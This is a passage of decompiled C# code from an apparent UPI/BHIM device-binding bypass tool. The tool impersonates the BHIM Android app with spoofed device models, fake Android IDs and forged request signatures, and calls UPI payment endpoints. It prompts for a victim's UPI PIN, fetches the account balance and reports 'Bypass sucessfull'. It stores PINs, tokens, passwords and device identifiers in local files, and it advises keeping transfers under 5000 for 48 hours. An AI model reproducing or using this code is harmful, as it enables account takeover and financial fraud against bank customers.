                            upiid = jsonData_Serial(str4, what4);
                            string text36 = mobilenumber.Text;
                            string text37 = "@upi";
                            string text38 = text36 + text37;
                            if (text38 != upiid)
                            {
                                upiid = text38;
                            }
                            string str5 = string_96;
                            string what5 = "token";
                            xlogintoken = jsonData_Serial(str5, what5);
                            text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                            Encoding uTF2 = Encoding.UTF8;
                            string text39 = text31;
                            string text40 = "|/api/v4/customers/config|W29iamVjdCBPYmplY3Rd";
                            s2 = Convert.ToBase64String(uTF2.GetBytes(text39 + text40));
                            inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                            string text41 = "v1|";
                            xsignature = text41 + Convert.ToBase64String(inArray);
                            string text42 = "https://upi.npci.org.in/api/v4/customers/config";
                            string_93 = text42;
                            ConnectHttp(string_93, null, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                            string text43 = string_96;
                            string value8 = "error\":true";
                            if (!text43.Contains(value8))
                            {
                                text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                                Encoding uTF3 = Encoding.UTF8;
                                string text44 = text31;
                                string text45 = "|/api/v4/customers|W29iamVjdCBPYmplY3Rd";
                                s2 = Convert.ToBase64String(uTF3.GetBytes(text44 + text45));
                                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                                string text46 = "v1|";
                                xsignature = text46 + Convert.ToBase64String(inArray);
                                string text47 = "https://upi.npci.org.in/api/v4/customers";
                                string_93 = text47;
                                ConnectHttp(string_93, null, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                                string str6 = string_96;
                                string what6 = "bankName";
                                string text48 = jsonData_Serial(str6, what6);
                                string str7 = string_96;
                                string what7 = "maskedAccountNumber";
                                jsonData_Serial(str7, what7);
                                string prompt2 = "Enter UPI PIN....";
                                string title2 = "Express";
                                string text49 = (upipinn = Interaction.InputBox(prompt2, title2));
                                text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                                Encoding uTF4 = Encoding.UTF8;
                                string text50 = text31;
                                string text51 = "|/api/v3/vpas|W29iamVjdCBPYmplY3Rd";
                                s2 = Convert.ToBase64String(uTF4.GetBytes(text50 + text51));
                                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                                string text52 = "v1|";
                                xsignature = text52 + Convert.ToBase64String(inArray);
                                string text53 = "https://upi.npci.org.in/api/v3/vpas";
                                string_93 = text53;
                                ConnectHttp(string_93, null, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                                string str8 = string_96;
                                string what8 = "name";
                                accname = jsonData_Serial(str8, what8);
                                string str9 = string_96;
                                string what9 = "id";
                                accid = jsonData_Serial(str9, what9);
                                text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                                Encoding uTF5 = Encoding.UTF8;
                                string text54 = text31;
                                string text55 = "|/api/v3/npci/signdata|W29iamVjdCBPYmplY3Rd";
                                s2 = Convert.ToBase64String(uTF5.GetBytes(text54 + text55));
                                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                                string text56 = "v1|";
                                xsignature = text56 + Convert.ToBase64String(inArray);
                                string text57 = "https://upi.npci.org.in/api/v3/npci/signdata";
                                string_93 = text57;
                                string text58 = "upi://pay?pa=7978499642@upi&pn=NARAYAN SAHU&cu=INR&mode=02&purpose=00";
                                string text59 = text58;
                                string text60 = text59;
                                string oldValue3 = "7978499642@upi";
                                text59 = text60.Replace(oldValue3, upiid);
                                string text61 = accname;
                                string oldValue4 = " ";
                                string newValue = "%20";
                                accname = text61.Replace(oldValue4, newValue);
                                string text62 = text59;
                                string oldValue5 = "NARAYAN SAHU";
                                text59 = text62.Replace(oldValue5, accname);
                                string text63 = "{\"data\":\"upi://pay?pa=7978499642@upi&pn=NARAYAN%20SAHU&cu=INR&mode=02&purpose=00\"}";
                                text11 = text63;
                                string text64 = text11;
                                string oldValue6 = "upi://pay?pa=7978499642@upi&pn=NARAYAN%20SAHU&cu=INR&mode=02&purpose=00";
                                text11 = text64.Replace(oldValue6, text59);
                                ConnectHttp(string_93, text11, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                                string text65 = string_96;
                                string value9 = "error\":true";
                                if (text65.Contains(value9))
                                {
                                    string str10 = string_96;
                                    string what10 = "userMessage";
                                    MessageBox.Show(jsonData_Serial(str10, what10));
                                    return;
                                }
                                string newValue2 = "";
                                string text66 = "";
                                try
                                {
                                    string text67 = GetRandAesKey().ToLower();
                                    text66 = GetRandAesKey().ToLower();
                                    string text68 = "2.3-v1.8|";
                                    string[] array2 = new string[5] { text67, null, null, null, null };
                                    string text69 = "|";
                                    array2[1] = text69;
                                    array2[2] = text66;
                                    string text70 = "|";
                                    array2[3] = text70;
                                    array2[4] = androidid;
                                    newValue2 = text68 + RsaEncrypt(string.Concat(array2), ReadPublicKeyFromCrt());
                                }
                                catch
                                {
                                }
                                text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                                timestampheader = text31.ToString();
                                Encoding uTF6 = Encoding.UTF8;
                                string text71 = text31;
                                string text72 = "|/api/v3/npci/token|W29iamVjdCBPYmplY3Rd";
                                s2 = Convert.ToBase64String(uTF6.GetBytes(text71 + text72));
                                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                                string text73 = "v1|";
                                xsignature = text73 + Convert.ToBase64String(inArray);
                                string text74 = "https://upi.npci.org.in/api/v3/npci/token";
                                string_93 = text74;
                                string text75 = "{\"type\":\"initial\",\"challenge\":[\"2.3-v1.8|oe29JGfmCcMWF15ZrNjUD43T6+vMHw==\"],\"clVersion\":\"2.0-01-20180331\"}";
                                text11 = text75;
                                string text76 = text11;
                                string oldValue7 = "2.3-v1.8|oe29JGfmCcMWF15ZrNjUD43T6+vMHw==";
                                text11 = text76.Replace(oldValue7, newValue2);
                                ConnectHttp(string_93, text11, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                                text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                                Encoding uTF7 = Encoding.UTF8;
                                string text77 = text31;
                                string text78 = "|/api/v3/npci/keys?clVersion=2.0-01-20180331|W29iamVjdCBPYmplY3Rd";
                                s2 = Convert.ToBase64String(uTF7.GetBytes(text77 + text78));
                                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                                string text79 = "v1|";
                                xsignature = text79 + Convert.ToBase64String(inArray);
                                string text80 = "https://upi.npci.org.in/api/v3/npci/keys?clVersion=2.0-01-20180331";
                                string_93 = text80;
                                ConnectHttp(string_93, null, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                                string newValue3 = "";
                                try
                                {
                                    string text81 = upipinn;
                                    string text82 = "UPI";
                                    string text83 = Guid.NewGuid().ToString();
                                    string oldValue8 = "-";
                                    string text84 = text83.Replace(oldValue8, string.Empty).ToUpper().Substring(0, 31);
                                    string text85 = "7";
                                    txnId = text82 + text84 + text85;
                                    string[] array3 = new string[7];
                                    string text86 = "0.00|";
                                    array3[0] = text86;
                                    array3[1] = txnId;
                                    string text87 = "|||in.org.npci.upiapp|";
                                    array3[2] = text87;
                                    array3[3] = mobilenumber.Text;
                                    string text88 = "|";
                                    array3[4] = text88;
                                    array3[5] = androidid;
                                    string text89 = "|reqBalEnq";
                                    array3[6] = text89;
                                    string input = string.Concat(array3);
                                    byte[] array4 = new byte[16];
                                    rngCsp.GetBytes(array4);
                                    string text90 = AESGCMEncryptToBase64(SHA256withKey(input, array4), StringToByteArray(text66), array4);
                                    string text91 = "|";
                                    string text92 = text90 + text91 + Convert.ToBase64String(array4);
                                    string[] array5 = new string[5] { text81, null, null, null, null };
                                    string text93 = "|";
                                    array5[1] = text93;
                                    array5[2] = txnId;
                                    string text94 = "|";
                                    array5[3] = text94;
                                    array5[4] = text92;
                                    string input2 = string.Concat(array5);
                                    string text95 = "MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAuDbDFnrdaI0hCnl2CoAn70a9krjKAaQCgtJfiEv6yDGBTC8lPfxisb/U5NIAf7JRcM2oo2YGf09aavVmvXzv5xgm9SwucHzveCi4/j/JxGZP6VUorbqX3aJHbClUyS5RsNKlkBYKKpcZH6RTHmn91FDjsjdHjUsrQK7R0hT0XLL8v0wUdhCjy2adhUlewrRFCvISJ1/jIr7BkqwH9nv+6SXL0IzSJDSibSshBFcLIv3mYF0joY370/j9pGFQOsdEduELO+AbYh1hIGu5KKQwzY0/CgKaonOzRVK+pAHxLrZt9mprRKDWRk4q3SaDG2J7ZfvAgbic67X/4IzU7py0vQIBAw==";
                                    string s3 = text95;
                                    AsymmetricKeyParameter publicKey = PublicKeyFactory.CreateKey(Convert.FromBase64String(s3));
                                    string text96 = RsaEncrypt(input2, publicKey);
                                    string text97 = "UPI";
                                    string text98 = Guid.NewGuid().ToString();
                                    string oldValue9 = "-";
                                    string text99 = text98.Replace(oldValue9, string.Empty).ToUpper().Substring(0, 31);
                                    string text100 = "7";
                                    txnId = text97 + text99 + text100;
                                    string text101 = upiid;
                                    string[] array6 = new string[11];
                                    string text102 = "0.00|";
                                    array6[0] = text102;
                                    array6[1] = txnId;
                                    string text103 = "|";
                                    array6[2] = text103;
                                    array6[3] = text101;
                                    string text104 = "|";
                                    array6[4] = text104;
                                    array6[5] = text101;
                                    string text105 = "|in.org.npci.upiapp|91";
                                    array6[6] = text105;
                                    array6[7] = mobilenumber.Text;
                                    string text106 = "|";
                                    array6[8] = text106;
                                    array6[9] = androidid;
                                    string text107 = "|reqBalEnq";
                                    array6[10] = text107;
                                    string input3 = string.Concat(array6);
                                    rngCsp.GetBytes(array4);
                                    string text108 = AESGCMEncryptToBase64(SHA256withKey(input3, array4), StringToByteArray(text66), array4);
                                    string text109 = "|";
                                    text92 = text108 + text109 + Convert.ToBase64String(array4);
                                    string[] array7 = new string[5] { text81, null, null, null, null };
                                    string text110 = "|";
                                    array7[1] = text110;
                                    array7[2] = txnId;
                                    string text111 = "|";
                                    array7[3] = text111;
                                    array7[4] = text92;
                                    string input4 = string.Concat(array7);
                                    publicKey = PublicKeyFactory.CreateKey(Convert.FromBase64String(s3));
                                    text96 = RsaEncrypt(input4, publicKey);
                                    string text112 = "2.3-v1.8|";
                                    newValue3 = text112 + text96;
                                }
                                catch
                                {
                                }
                                text31 = Convert.ToString((int)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
                                Encoding uTF8 = Encoding.UTF8;
                                string text113 = text31;
                                string text114 = "|/api/v3/accounts/";
                                string text115 = accid;
                                string text116 = "|W29iamVjdCBPYmplY3Rd";
                                s2 = Convert.ToBase64String(uTF8.GetBytes(text113 + text114 + text115 + text116));
                                inArray = HashHMAC(Encoding.UTF8.GetBytes(s), Encoding.UTF8.GetBytes(s2));
                                string text117 = "v1|";
                                xsignature = text117 + Convert.ToBase64String(inArray);
                                string text118 = "https://upi.npci.org.in/api/v3/accounts/";
                                string_93 = text118 + accid;
                                string text119 = "{\"upiRequestId\":\"UPI1F38DDF8359F47BB9AEE8017CEEFCD77\",\"npciData\":{\"mpincred\":{\"MPIN\":{\"reqBalEnq\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.3-v1.8|n4XCrOg==\",\"hmac\":null,\"ki\":\"20150822\",\"oda\":null,\"pid\":null,\"skey\":null,\"type\":null},\"subType\":\"MPIN\",\"type\":\"PIN\"}}},\"cred\":{\"MPIN\":{\"reqBalEnq\":{\"data\":{\"code\":\"NPCI\",\"encryptedBase64String\":\"2.3-v1.8|n4XCrOg==\",\"hmac\":null,\"ki\":\"20150822\",\"oda\":null,\"pid\":null,\"skey\":null,\"type\":null},\"subType\":\"MPIN\",\"type\":\"PIN\"}}}},\"updateType\":\"balance\"}";
                                text11 = text119;
                                string text120 = text11;
                                string oldValue10 = "UPI1F38DDF8359F47BB9AEE8017CEEFCD77";
                                text11 = text120.Replace(oldValue10, txnId);
                                string text121 = text11;
                                string oldValue11 = "2.3-v1.8|n4XCrOg==";
                                text11 = text121.Replace(oldValue11, newValue3);
                                ConnectHttp(string_93, text11, string_92, ref webProxy_3, ref cookieContainer_3, bool_63: false, bool_64: true, 180000, 180000, ref string_96, ref string_95, ref webException_0);
                                string text122 = string_96;
                                string value10 = "error\":true";
                                if (!text122.Contains(value10))
                                {
                                    string str11 = string_96;
                                    string what11 = "balance";
                                    string text123 = jsonData_Serial(str11, what11);
                                    try
                                    {
                                        string text124 = "./BHIM_NCPI";
                                        string text125 = text124;
                                        if (!Directory.Exists(text125))
                                        {
                                            Directory.CreateDirectory(text125);
                                        }
                                        string text126 = mobilenumber.Text;
                                        string text127 = "@upi";
                                        string text128 = text126 + text127;
                                        string text129 = "\\";
                                        string text130 = ".rg";
                                        Path_ = text125 + text129 + text128 + text130;
                                        string[] array8 = new string[21];
                                        array8[0] = xcaccessid;
                                        string text131 = "||##||";
                                        array8[1] = text131;
                                        array8[2] = text128;
                                        string text132 = "||##||";
                                        array8[3] = text132;
                                        array8[4] = xsignature;
                                        string text133 = "||##||";
                                        array8[5] = text133;
                                        array8[6] = txt_pass.Text;
                                        string text134 = "||##||";
                                        array8[7] = text134;
                                        array8[8] = text49;
                                        string text135 = "||##||";
                                        array8[9] = text135;
                                        array8[10] = text48;
                                        string text136 = "||##||";
                                        array8[11] = text136;
                                        array8[12] = text66;
                                        string text137 = "||##||";
                                        array8[13] = text137;
                                        array8[14] = registertoken;
                                        string text138 = "||##||";
                                        array8[15] = text138;
                                        array8[16] = androidid;
                                        string text139 = "||##||";
                                        array8[17] = text139;
                                        array8[18] = mobilenumber.Text;
                                        string text140 = "||##||";
                                        array8[19] = text140;
                                        array8[20] = accid;
                                        string val = string.Concat(array8);
                                        Table_Write_Save_RegisInfo(val, mobilenumber.Text, upipinn, upiid);
                                        string[] array9 = new string[5];
                                        string text141 = "Bypass sucessfull.\r\nYour Account Balance in ";
                                        array9[0] = text141;
                                        array9[1] = text48;
                                        string text142 = " is --> ";
                                        array9[2] = text142;
                                        array9[3] = text123;
                                        string text143 = "\r\n Please remember use only 5000 amount for 48hours after that you can use as much you want.";
                                        array9[4] = text143;
                                        string text144 = string.Concat(array9);
                                        string caption = "Sucess";
                                        MessageBox.Show(text144, caption, MessageBoxButtons.OK);
                                        Close();
                                        return;
                                    }
                                    catch
                                    {
                                        return;
                                    }
                                }
                                string str12 = string_96;
                                string what12 = "userMessage";
                                MessageBox.Show(jsonData_Serial(str12, what12));
                            }
                            else
                            {
                                string str13 = string_96;
                                string what13 = "userMessage";
                                MessageBox.Show(jsonData_Serial(str13, what13));
                            }
                        }
                        else
                        {
                            string str14 = string_96;
                            string what14 = "userMessage";
                            MessageBox.Show(jsonData_Serial(str14, what14));
                        }
                    }
                    else
                    {
                        string str15 = string_96;
                        string what15 = "userMessage";
                        MessageBox.Show(jsonData_Serial(str15, what15));
                    }
                }
                else
                {
                    string str16 = string_96;
                    string what16 = "userMessage";
                    MessageBox.Show(jsonData_Serial(str16, what16));
                }
            }
            else
            {
                string text145 = "SMS NOT RECEIVED BY THE SERVER TRY AGAIN QUCIKER";
                MessageBox.Show(text145);
            }
        }
        else
        {
            string text146 = "You have exceeded the attempts to link your device for the day. Kindly try again after 24 hours";
            MessageBox.Show(text146);
        }
    }

    private string method_1()
    {
        string text = listName;
        string[] array = new string[1];
        string text2 = ",";
        array[0] = text2;
        string[] array2 = text.Split(array, StringSplitOptions.None);
        int num = new Random().Next(0, array2.Length);
        return array2[num];
    }

    public static byte[] StringToByteArray(string hex)
    {
        return (from x in Enumerable.Range(0, hex.Length)
                where x % 2 == 0
                select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
    }

    public static string ByteArrayToString(byte[] ba)
    {
        StringBuilder stringBuilder = new StringBuilder(ba.Length * 2);
        foreach (byte b in ba)
        {
            string format = "{0:x2}";
            stringBuilder.AppendFormat(format, b);
        }
        return stringBuilder.ToString();
    }

    private static string sha256(string inputString)
    {
        SHA256Managed sHA256Managed = new SHA256Managed();
        string text = string.Empty;
        byte[] array = sHA256Managed.ComputeHash(Encoding.ASCII.GetBytes(inputString));
        byte[] array2 = array;
        foreach (byte b in array2)
        {
            string text2 = text;
            string text3 = "x2";
            text = text2 + b.ToString(text3);
        }
        return text;
    }

    public static string GetRandomGCMToken()
    {
        string[] array = new string[5];
        string chars = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP0123456789";
        array[0] = RandomString(22, chars);
        string text = ":";
        array[1] = text;
        string chars2 = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP0123456789";
        array[2] = RandomString(91, chars2);
        string text2 = "-";
        array[3] = text2;
        string chars3 = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP0123456789";
        array[4] = RandomString(48, chars3);
        return string.Concat(array);
    }

    public static string appgenid()
    {
        string text = Guid.NewGuid().ToString();
        string oldValue = "-";
        return text.Replace(oldValue, string.Empty).ToUpper();
    }

    public static string md5(string inputString)
    {
        MD5 mD = MD5.Create();
        StringBuilder stringBuilder = new StringBuilder();
        byte[] array = mD.ComputeHash(Encoding.UTF8.GetBytes(inputString));
        byte[] array2 = array;
        foreach (byte b in array2)
        {
            string text = "X2";
            stringBuilder.Append(b.ToString(text));
        }
        return stringBuilder.ToString();
    }

    public string simidd()
    {
        string chars = "1234567890";
        string text = RandomString(10, chars);
        string text2 = "NASA";
        return md5(text + text2 + text).ToLower().Substring(0, 17);
    }

    public Image LoadImage(string strin_1)
    {
        return Image.FromStream(new MemoryStream(Convert.FromBase64String(strin_1)));
    }

    public static string smethod_0()
    {
        string[] array = new string[10];
        string text = "SM-J100H";
        array[0] = text;
        string text2 = "U900-Soul";
        array[1] = text2;
        string text3 = "SGH-N100";
        array[2] = text3;
        string text4 = "SGH-X510";
        array[3] = text4;
        string text5 = "GT-I9060";
        array[4] = text5;
        string text6 = "GT-I8262";
        array[5] = text6;
        string text7 = "SGH-Z170";
        array[6] = text7;
        string text8 = "SGH-T408";
        array[7] = text8;
        string text9 = "SGH-S300";
        array[8] = text9;
        string text10 = "SM-G925F";
        array[9] = text10;
        string_0 = array;
        random_0 = new Random();
        return string_0[random_0.Next(string_0.Length)];
    }

    public static string RandomString(int length, string chars)
    {
        return new string((from s in Enumerable.Repeat(chars, length)
                           select s[random.Next(s.Length)]).ToArray());
    }

    internal static string RandomStrinAg(int int_28, string string_86)
    {
        char[] array = new char[int_28];
        Random random = new Random();
        for (int i = 0; i < array.Length; i++)
        {
            array[i] = string_86[random.Next(string_86.Length)];
        }
        return new string(array);
    }

    public static string jsonData_Serial(string str, string what)
    {
        string result = "";
        try
        {
            string text = "\"";
            string text2 = "\"";
            int startIndex = str.IndexOf(text + what + text2, StringComparison.CurrentCultureIgnoreCase);
            string text3 = str.Substring(startIndex);
            string text4 = text3;
            string text5 = text3;
            string value = ":\"";
            text3 = text4.Substring(text5.IndexOf(value) + 2);
            string text6 = text3;
            string text7 = text3;
            string value2 = "\"";
            result = text6.Substring(0, text7.IndexOf(value2));
            return result;
        }
        catch
        {
            return result;
        }
    }

    public static string AESGCMEncryptToBase64(byte[] textBytes, byte[] key, byte[] nonce)
    {
        GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
        AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, nonce);
        gcmBlockCipher.Init(forEncryption: true, parameters);
        byte[] array = new byte[gcmBlockCipher.GetOutputSize(textBytes.Length)];
        int outOff = gcmBlockCipher.ProcessBytes(textBytes, 0, textBytes.Length, array, 0);
        gcmBlockCipher.DoFinal(array, outOff);
        return Convert.ToBase64String(array);
    }

    public static byte[] SHA256withKey(string input, byte[] key)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        SHA256 sHA = SHA256.Create();
        sHA.TransformBlock(key, 0, key.Length, key, 0);
        sHA.TransformFinalBlock(bytes, 0, bytes.Length);
        return sHA.Hash;
    }

    private static byte[] HashHMAC(byte[] key, byte[] message)
    {
        return new HMACSHA256(key).ComputeHash(message);
    }

    internal static string GetRandAesKey()
    {
        try
        {
            byte[] array = new byte[LenghtAesKeyBytes];
            rngCsp.GetBytes(array);
            return bytesToHexString(array);
        }
        catch
        {
            return "";
        }
    }

    public static string sha256_hashing(string input, string key)
    {
        return Convert.ToBase64String(EncryptAESA(Sha256Hash(input), HexStringToByteArray(key)));
    }

    private static byte[] EncryptAESA(byte[] input, byte[] key)
    {
        string algorithm = "AES/CBC/PKCS5Padding";
        IBufferedCipher cipher = CipherUtilities.GetCipher(algorithm);
        string algorithm2 = "AES";
        ParameterUtilities.CreateKeyParameter(algorithm2, key);
        cipher.Init(forEncryption: true, new ParametersWithIV(new KeyParameter(key), new byte[16]));
        return cipher.DoFinal(input);
    }

    private static byte[] Sha256Hash(string input)
    {
        Sha256Digest sha256Digest = new Sha256Digest();
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        sha256Digest.BlockUpdate(bytes, 0, bytes.Length);
        byte[] array = new byte[sha256Digest.GetDigestSize()];
        sha256Digest.DoFinal(array, 0);
        return array;
    }

    private static byte[] HexStringToByteArray(string hexString)
    {
        int length = hexString.Length;
        byte[] array = new byte[length / 2];
        for (int i = 0; i < length; i += 2)
        {
            array[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
        }
        return array;
    }

    public static string RSA_ENCRYPT_PKEY(string input, string base64PublicKey)
    {
        AsymmetricKeyParameter publicKey = PublicKeyFactory.CreateKey(Convert.FromBase64String(base64PublicKey));
        return RsaEncrypt(input, publicKey);
    }

    private static AsymmetricKeyParameter ReadPublicKeyFromCrt()
    {
        try
        {
            return new X509CertificateParser().ReadCertificate(Encoding.UTF8.GetBytes(x509CertSecondService)).GetPublicKey();
        }
        catch (Exception)
        {
            return null;
        }
    }

    public static string RsaEncrypt(string input, AsymmetricKeyParameter publicKey)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(input);
        byte[] inArray;
        try
        {
            OaepEncoding oaepEncoding = new OaepEncoding(new RsaEngine(), new Sha256Digest(), new Sha256Digest(), null);
            oaepEncoding.Init(forEncryption: true, publicKey);
            inArray = oaepEncoding.ProcessBlock(bytes, 0, bytes.Length);
        }
        catch (Exception ex)
        {
            string text = "Exception while encrypting data: ";
            return text + ex.Message;
        }
        return Convert.ToBase64String(inArray);
    }

    public static RSACryptoServiceProvider parseX509Cert(string x509Cert)
    {
        string text = x509Cert;
        string oldValue = "\r\n";
        string newValue = "\n";
        x509Cert = text.Replace(oldValue, newValue);
        byte[] bytes = Encoding.UTF8.GetBytes(x509Cert);
        X509Certificate2 x509Certificate = new X509Certificate2();
        x509Certificate.Import(bytes);
        string format = "{0}Subject: {1}{0}";
        Console.WriteLine(format, Environment.NewLine, x509Certificate.Subject);
        string format2 = "{0}Issuer: {1}{0}";
        Console.WriteLine(format2, Environment.NewLine, x509Certificate.Issuer);
        string format3 = "{0}Version: {1}{0}";
        Console.WriteLine(format3, Environment.NewLine, x509Certificate.Version);
        string format4 = "{0}Valid Date: {1}{0}";
        Console.WriteLine(format4, Environment.NewLine, x509Certificate.NotBefore);
        string format5 = "{0}Expiry Date: {1}{0}";
        Console.WriteLine(format5, Environment.NewLine, x509Certificate.NotAfter);
        string format6 = "{0}Thumbprint: {1}{0}";
        Console.WriteLine(format6, Environment.NewLine, x509Certificate.Thumbprint);
        string format7 = "{0}Serial Number: {1}{0}";
        Console.WriteLine(format7, Environment.NewLine, x509Certificate.SerialNumber);
        string format8 = "{0}Friendly Name: {1}{0}";
        Console.WriteLine(format8, Environment.NewLine, x509Certificate.PublicKey.Oid.FriendlyName);
        string format9 = "{0}Public Key Format: {1}{0}";
        Console.WriteLine(format9, Environment.NewLine, x509Certificate.PublicKey.EncodedKeyValue.Format(multiLine: true));
        string format10 = "{0}Raw Data Length: {1}{0}";
        Console.WriteLine(format10, Environment.NewLine, x509Certificate.RawData.Length);
        string format11 = "{0}Certificate to string: {1}{0}";
        Console.WriteLine(format11, Environment.NewLine, x509Certificate.ToString(verbose: true));
        return (RSACryptoServiceProvider)x509Certificate.PublicKey.Key;
    }

    public static string bytesToHexString(byte[] bArr)
    {
        char[] array = new char[bArr.Length * 2];
        for (int i = 0; i < bArr.Length; i++)
        {
            int num = bArr[i] & 0xFF;
            array[i * 2] = hexArray[num >> 4];
            array[i * 2 + 1] = hexArray[num & 0xF];
        }
        return new string(array);
    }

    private bool ConnectHttp(string url, string _data, string _reff, ref WebProxy webProxy_5, ref CookieContainer _cookie, bool bool_63, bool bool_64, int int_28, int int_29, ref string _reponse, ref string _Error, ref WebException webExcep)
    {
        int num = 0;
        while (true)
        {
            bool flag = false;
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            _Error = "";
            _reponse = "";
            bool result = false;
            HttpWebResponse httpWebResponse = null;
            string text = "";
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                httpWebRequest.Timeout = int_28;
                httpWebRequest.ReadWriteTimeout = int_29;
                httpWebRequest.Proxy = webProxy_5;
                httpWebRequest.KeepAlive = true;
                httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip;
                ServicePointManager.Expect100Continue = true;
                if (_cookie == null)
                {
                    _cookie = new CookieContainer();
                }
                httpWebRequest.CookieContainer = _cookie;
                string connection = "keepalive";
                httpWebRequest.Connection = connection;
                string contentType = "application/json; charset=utf-8";
                httpWebRequest.ContentType = contentType;
                string userAgent = "bhim/ANDROID/26.3/4.0.16";
                httpWebRequest.UserAgent = userAgent;
                if (string.IsNullOrEmpty(xcaccessid))
                {
                    WebHeaderCollection headers = httpWebRequest.Headers;
                    string name = "x-caccess-id";
                    string value = "null";
                    headers.Add(name, value);
                }
                else
                {
                    WebHeaderCollection headers2 = httpWebRequest.Headers;
                    string name2 = "x-caccess-id";
                    headers2.Add(name2, xcaccessid);
                }
                if (string.IsNullOrEmpty(xsignature))
                {
                    WebHeaderCollection headers3 = httpWebRequest.Headers;
                    string name3 = "x-signature";
                    string value2 = "-";
                    headers3.Add(name3, value2);
                }
                else
                {
                    WebHeaderCollection headers4 = httpWebRequest.Headers;
                    string name4 = "x-signature";
                    headers4.Add(name4, xsignature);
                }
                if (!string.IsNullOrEmpty(xlogintoken))
                {
                    WebHeaderCollection headers5 = httpWebRequest.Headers;
                    string name5 = "x-login-token";
                    headers5.Add(name5, xlogintoken);
                }
                string value3 = "https://upi.npci.org.in/api/v3/npci/token";
                if (!url.Contains(value3))
                {
                    string value4 = DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
                    WebHeaderCollection headers6 = httpWebRequest.Headers;
                    string name6 = "x-timestamp";
                    headers6.Add(name6, value4);
                }
                else
                {
                    WebHeaderCollection headers7 = httpWebRequest.Headers;
                    string name7 = "x-timestamp";
                    headers7.Add(name7, timestampheader);
                }
                if (string.IsNullOrEmpty(_data))
                {
                    string method = "GET";
                    httpWebRequest.Method = method;
                }
                else
                {
                    string method2 = "POST";
                    httpWebRequest.Method = method2;
                    byte[] bytes = Encoding.UTF8.GetBytes(_data);
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                }
                httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                if (!flag || (httpWebResponse.StatusCode != HttpStatusCode.Found && httpWebResponse.StatusCode != HttpStatusCode.MovedPermanently))
                {
                    goto IL_02ae;
                }
                WebHeaderCollection headers8 = httpWebResponse.Headers;
                string name8 = "Location";
                string text2 = headers8[name8].ToString();
                string value5 = "error";
                if (!text2.Contains(value5) || num >= 20)
                {
                    goto IL_02ae;
                }
                Thread.Sleep(200);
                num++;
                httpWebResponse.Close();
                httpWebResponse = null;
                goto end_IL_0007;
            IL_02ae:
                using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                {
                    if (bool_64)
                    {
                        text = streamReader.ReadToEnd();
                    }
                    else
                    {
                        httpWebRequest.Abort();
                    }
                }
                if (httpWebResponse != null)
                {
                    try
                    {
                        WebHeaderCollection headers9 = httpWebResponse.Headers;
                        string name9 = "X-Request-For";
                        if (headers9[name9] != null)
                        {
                            WebHeaderCollection headers10 = httpWebResponse.Headers;
                            string name10 = "X-Request-For";
                            headers10[name10].ToString().Trim();
                        }
                    }
                    catch
                    {
                        string text3 = "Check Internet Connection";
                        _reponse = text3;
                        return true;
                    }
                }
                if (httpWebResponse != null)
                {
                    WebHeaderCollection headers11 = httpWebResponse.Headers;
                    string name11 = "Date";
                    _ = headers11[name11];
                }
                _reponse = text;
                result = true;
                stopwatch.Stop();
                return true;
            end_IL_0007:;
            }
            catch (WebException ex)
            {
                string text4 = "";
                string message = ex.Message;
